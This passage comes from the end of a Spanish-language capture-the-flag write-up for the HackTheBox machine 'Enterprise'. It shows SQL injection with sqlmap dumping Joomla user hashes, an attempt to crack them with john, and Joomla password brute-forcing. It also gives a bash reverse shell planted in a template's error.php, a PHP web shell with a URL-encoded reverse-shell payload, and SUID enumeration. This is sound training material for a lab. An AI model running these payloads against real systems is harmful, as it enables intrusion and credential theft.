</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_terms_common     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_tokens           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_tokens_aggregate <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_types            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_languages               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_menu                    <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_menu_types              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_messages                <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_messages_cfg            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_modules                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_modules_menu            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_newsfeeds               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_overrider               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_postinstall_messages    <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_redirect_links          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_schemas                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_session                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_tags                    <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_template_styles         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_ucm_base                <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_ucm_content             <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_ucm_history             <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_update_sites            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_update_sites_extensions <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_updates                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_user_keys               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_user_notes              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_user_profiles           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_user_usergroup_map      <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_usergroups              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_users                   <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_utf8_conversion         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_viewlevels              <span class=p>|</span>
</span></span><span class=line><span class=cl>+-------------------------------+
</span></span></code></pre></div><p>Ahora vamos a ver el contenido de la tabla <code>edz2g_users</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap --url <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#34;</span> --batch -D joomladb -T edz2g_users --dump
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database: joomladb
</span></span><span class=line><span class=cl>Table: edz2g_users
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>2</span> entries<span class=o>]</span>
</span></span><span class=line><span class=cl>+-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> id  <span class=p>|</span> otep    <span class=p>|</span> email                          <span class=p>|</span> name       <span class=p>|</span> otpKey  <span class=p>|</span> params                                                                                       <span class=p>|</span> block   <span class=p>|</span> password                                                     <span class=p>|</span> username        <span class=p>|</span> sendEmail <span class=p>|</span> activation <span class=p>|</span> resetCount <span class=p>|</span> registerDate        <span class=p>|</span> requireReset <span class=p>|</span> lastResetTime       <span class=p>|</span> lastvisitDate       <span class=p>|</span>
</span></span><span class=line><span class=cl>+-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=m>400</span> <span class=p>|</span> &lt;blank&gt; <span class=p>|</span> geordi.la.forge@enterprise.htb <span class=p>|</span> Super User <span class=p>|</span> &lt;blank&gt; <span class=p>|</span> <span class=o>{</span><span class=s2>&#34;admin_style&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;admin_language&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;language&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;editor&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;helpsite&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;timezone&#34;</span>:<span class=s2>&#34;&#34;</span><span class=o>}</span> <span class=p>|</span> <span class=m>0</span>       <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10$cXSgEkNQGBBUneDKXq9gU</span>.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy <span class=p>|</span> geordi.la.forge <span class=p>|</span> <span class=m>1</span>         <span class=p>|</span> <span class=m>0</span>          <span class=p>|</span> <span class=m>0</span>          <span class=p>|</span> 2017-09-03 19:30:04 <span class=p>|</span> <span class=m>0</span>            <span class=p>|</span> 0000-00-00 00:00:00 <span class=p>|</span> 2017-10-17 04:24:50 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=m>401</span> <span class=p>|</span> &lt;blank&gt; <span class=p>|</span> guinan@enterprise.htb          <span class=p>|</span> Guinan     <span class=p>|</span> &lt;blank&gt; <span class=p>|</span> <span class=o>{</span><span class=s2>&#34;admin_style&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;admin_language&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;language&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;editor&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;helpsite&#34;</span>:<span class=s2>&#34;&#34;</span>,<span class=s2>&#34;timezone&#34;</span>:<span class=s2>&#34;&#34;</span><span class=o>}</span> <span class=p>|</span> <span class=m>0</span>       <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10$90</span>gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q <span class=p>|</span> Guinan          <span class=p>|</span> <span class=m>0</span>         <span class=p>|</span> &lt;blank&gt;    <span class=p>|</span> <span class=m>0</span>          <span class=p>|</span> 2017-09-06 12:38:03 <span class=p>|</span> <span class=m>0</span>            <span class=p>|</span> 0000-00-00 00:00:00 <span class=p>|</span> 0000-00-00 00:00:00 <span class=p>|</span>
</span></span><span class=line><span class=cl>+-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
</span></span></code></pre></div><p>Vemos 2 usuarios con sus respectivas credenciales hasheadas las cuales podemos tratar de romper con john</p><pre tabindex=0><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</code></pre><p>Lo deje un buen rato pero no las encuentra. Puede ser que alguna de las credenciales que habia en el post de wordpress sean las del joomla. Con este <a href=https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py>script</a> podemos hacer fuerza bruta para encontrar las credenciales correctas del joomla</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 joomla-brute.py -u http://10.10.10.61:8080 -usr geordi.la.forge -w passwords.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>geordi.la.forge:ZD3YxfnSjezg67JZ
</span></span></code></pre></div><p>Ya tenemos credenciales validas para el Joomla como Super user. Para mandarnos la reverse shell es bastante parecido a wordpress, simplemente hay que ir a Extensions > Templates > Templates > El tema que este en uso > error.php y pegamos el mismo codigo de wordpress.</p><pre tabindex=0><code>system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.4/443 0&gt;&amp;1&#34;&#39;);
</code></pre><p>Nos ponemos en escucha con netcat</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>n</strong>: Sirve para que no haga la resolución de DNS</li><li><strong>l</strong>: Habilitar modo escucha de netcat</li><li><strong>v</strong>: Verbose, modo detallado de netcat</li><li><strong>p</strong>: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha</li></ul></details><br><p>Y hacemos un curl a una pagina random que no exsista de la web.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://10.10.10.61:8080/testing
</span></span></code></pre></div><p>Recibimos la conexión!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.4<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.61<span class=o>]</span> <span class=m>42390</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@a7018bfdc454:/var/www/html$ 
</span></span></code></pre></div><p>Antes de segir, vamos a hacer un tratamiento de la tty para poder ejecutar <code>ctr + c</code>, <code>ctrl + l</code>, nano&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset xterm
</span></span></code></pre></div><p>Ahora si hacemos un <code>echo $TERM</code> vemos que vale dumb pero para poder hacer <code>ctrl + l</code> necesitamos que valga xterm</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Por ultimo si miramos la shell que tenemos <code>echo $SHELL</code> vemos que tenemos <code>/usr/sbin/nologin</code> asi que vamos a asignar una bash</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
</span></span></code></pre></div><p>Si hacemos un ip a vemos que estamos en un contenedor distinto al de wordpress</p><pre tabindex=0><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
8: eth0@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.4/16 scope global eth0
       valid_lft forever preferred_lft forever
</code></pre><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><h3 id=saliendo-del-docker>Saliendo del docker<a href=#saliendo-del-docker class=anchor aria-hidden=true>#</a></h3><p>En la consola que hemos obtenido con el Joomla si vamos a /var/www/html vemos que hay una carpeta llamada files, dentro de la carpeta hay un lcars.zip. Esto es lo mismo que veiamos desde la web que corria por el puerto 443, puede ser que tengan esta carpeta sincronizada. Dentro de la carpeta files tenemos capazidad de escritura, podemos poner un php malicioso e intentarlo ejecutar desde la web que corre por el puerto 443.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>8bfdc454:/var/www/html/files$ <span class=nb>echo</span> <span class=s1>&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt; script.php
</span></span></code></pre></div><p>Ahora si entramos en la web, abrimos el script.php y por get por el parametro cmd le ponemos un comando vemos el resultado</p><pre tabindex=0><code>https://10.10.10.61/files/script.php?cmd=ls
</code></pre><p>Para mandar la reversres shell vamos a usar lo mismo de siempre (bash -c &ldquo;bash -i >& /dev/tcp/10.10.14.4/443 0>&amp;1&rdquo;) pero lo vamos a passar por un url encoder para que no de problemas</p><pre tabindex=0><code>https://10.10.10.61/files/script.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22
</code></pre><p>Nos ponemos en escucha con netcat</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>n</strong>: Sirve para que no haga la resolución de DNS</li><li><strong>l</strong>: Habilitar modo escucha de netcat</li><li><strong>v</strong>: Verbose, modo detallado de netcat</li><li><strong>p</strong>: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha</li></ul></details><br><p>Recibimos la conexión!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.4<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.61<span class=o>]</span> <span class=m>37558</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1531<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@enterprise:/var/www/html/files$ 
</span></span></code></pre></div><p>Antes de continuar con la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar <code>ctr + c</code>, <code>ctrl + l</code>, nano&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset xterm
</span></span></code></pre></div><p>Ahora si hacemos un <code>echo $TERM</code> vemos que vale dumb pero para poder hacer <code>ctrl + l</code> necesitamos que valga xterm</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Por ultimo si miramos la shell que tenemos <code>echo $SHELL</code> vemos que tenemos <code>/usr/sbin/nologin</code> asi que vamos a asignar una bash</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
</span></span></code></pre></div><h3 id=root>root<a href=#root class=anchor aria-hidden=true>#</a></h3><p>Buscando permisos archivos con permisos SUID vemos que exsiste uno llamado lcars (Como el plugin), el cual su propietario es root y tiene permisos SUID asi que si lo ejecutamos lo estamos ejecutando como root</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@enterprise:/$ find / -perm -4000 -exec ls -ldb <span class=o>{}</span> <span class=se>\;</span> 2&gt;/dev/null
</span></span><span class=line><span class=cl>.....
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>38984</span> May <span class=m>18</span>  <span class=m>2017</span> /bin/mount
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>12152</span> Sep  <span class=m>8</span>  <span class=m>2017</span> /bin/lcars
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>30800</span> Aug <span class=m>11</span>  <span class=m>2016</span> /bin/fusermount
</span></span></code></pre></div><p><small>November 11, 2023&nbsp;by&nbsp;<a class="stretched-link position-relative" href=/contributors/d3b0o/>d3b0o</a><span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>22&nbsp;minutes</span></small></p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/intro/bienvenido/ class="stretched-link text-reset text-decoration-none">Bienvenido</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/hackthebox/jupiter/ class="stretched-link text-reset text-decoration-none">Jupiter</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div></body></html>